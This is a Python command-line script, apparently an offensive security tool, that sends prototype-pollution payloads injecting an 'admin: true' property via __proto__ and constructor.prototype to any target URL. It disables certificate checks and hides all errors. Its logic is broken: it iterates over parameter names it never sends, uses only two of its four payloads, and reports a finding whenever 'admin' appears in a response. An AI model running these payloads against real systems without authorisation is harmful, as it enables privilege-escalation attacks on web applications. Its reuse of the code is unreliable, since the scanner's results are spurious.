#!/usr/bin/env python3
"""
Prototype Pollution Scanner
Tests for prototype pollution vulnerabilities
"""

import requests
import json
import argparse
import warnings
warnings.filterwarnings('ignore')

PAYLOADS = [
    {"__proto__": {"admin": True}},
    {"constructor": {"prototype": {"admin": True}}},
    {"__proto__.admin": "true"},
    {"constructor.prototype.admin": True},
]

def scan(target):
    print(f"[*] Prototype Pollution Scanner - {target}")
    print("="*50)
    
    if not target.startswith(('http://', 'https://')):
        target = 'https://' + target
    
    found = []
    params = ['data', 'config', 'settings', 'json', 'object']
    
    for param in params:
        for payload in PAYLOADS[:2]:
            try:
                r = requests.post(target, json=payload, timeout=10, verify=False)
                if 'admin' in r.text.lower():
                    print(f"[?] Possible PP: {param}")
                    found.append(param)
            except:
                pass
    
    print("\n" + "="*50)
    print(f"[*] Found {len(found)} issues")
    return found

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Prototype Pollution')
    parser.add_argument('target', help='Target URL')
    args = parser.parse_args()
    scan(args.target)